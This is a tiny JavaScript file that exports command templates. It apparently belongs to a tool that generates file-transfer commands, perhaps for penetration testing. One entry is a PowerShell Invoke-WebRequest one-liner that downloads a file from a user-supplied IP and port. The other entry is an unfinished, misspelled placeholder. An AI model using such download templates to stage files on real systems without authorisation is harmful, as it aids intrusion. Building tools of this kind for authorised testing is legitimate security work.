export default [
  {
    name: 'PowerShell 1',
    command:
      'powershell.exe -Command "Invoke-WebRequest -Uri http://{ip}:{port}/{source} -OutFile {destination}"',
  },
  {
    name: 'PowerShell 2',
    command: 'pwoershell 2 command',
  },
];
